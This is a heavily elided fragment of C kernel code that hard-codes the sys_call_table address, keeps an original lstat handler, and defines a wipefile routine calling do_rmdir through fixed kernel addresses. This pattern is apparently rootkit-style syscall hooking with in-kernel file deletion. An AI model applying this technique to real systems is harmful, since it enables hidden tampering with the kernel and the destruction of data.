...
void **sys_call_table = (void **)0xffffffff8164f400;
...
/*
        ...
        ul_fs = (void*)(mmm + 2);
        if ((ret = (*lstat_orig)(ppath, ul_fs)) < 0) {
...
int wipefile(int dfd, const char *ul_filename,int flags) {
	...
	struct filename* (*getname)(const char *filename) = (void *)0xffffffff811ef3f0;
	void (*putname)(struct filename *name) = (void *)0xffffffff811ef1f0;
	static long (*do_rmdir)(int dfd, const char *pathname) = (void*)0xffffffff811ef650;
